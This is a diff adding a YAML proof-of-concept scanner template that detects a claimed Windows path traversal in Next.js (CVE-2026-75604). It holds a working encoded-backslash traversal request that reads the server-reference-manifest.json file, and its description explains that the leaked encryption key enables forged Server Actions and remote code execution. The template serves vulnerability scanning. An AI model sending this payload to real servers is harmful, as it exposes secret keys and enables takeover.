@@ -1,0 +1,15 @@
+name: poc-yaml-nextjs-windows-path-traversal
+groups:
+  detect:
+    - method: GET
+      path: /pages-cache/seed/..%5C..%5C..%5C.next%5Cserver%5Cserver-reference-manifest.json
+      follow_redirects: false
+      expression: >
+        response.status == 200 && (response.body.bcontains(b"encryptionKey") || response.body.bcontains(b"serverActions") || response.body.bcontains(b"server-reference-manifest"))
+detail:
+  author: L4xy
+  description: "Next.js >=13.4 <15.5.24 及 >=16.0 <16.3.3 在Windows系统上存在路径遍历漏洞(CVE-2026-75604)，攻击者可通过..%5C编码穿越缓存目录读取server-reference-manifest.json获取加密密钥，进而伪造Server Action实现RCE"
+  links:
+    - https://github.com/vercel/next.js/security/advisories/GHSA-p293-qw3h-jr36
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-75604
+  tags: path-traversal,nextjs,rce
